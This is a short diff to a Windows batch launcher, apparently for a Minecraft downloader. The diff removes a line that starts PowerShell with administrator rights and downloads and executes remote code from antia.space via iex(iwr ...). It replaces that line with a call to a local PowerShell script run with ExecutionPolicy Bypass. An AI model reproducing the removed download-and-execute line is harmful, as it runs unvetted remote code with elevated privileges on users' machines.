@@ -1,2 +1,3 @@
 @echo off
-PowerShell -Command "Start-Process PowerShell -Verb RunAs -ArgumentList '-Command iex (iwr https://antia.space/majestic)'"
+cd /d "%~dp0"
+start "" powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%~dp0minecraft_downloader.ps1"
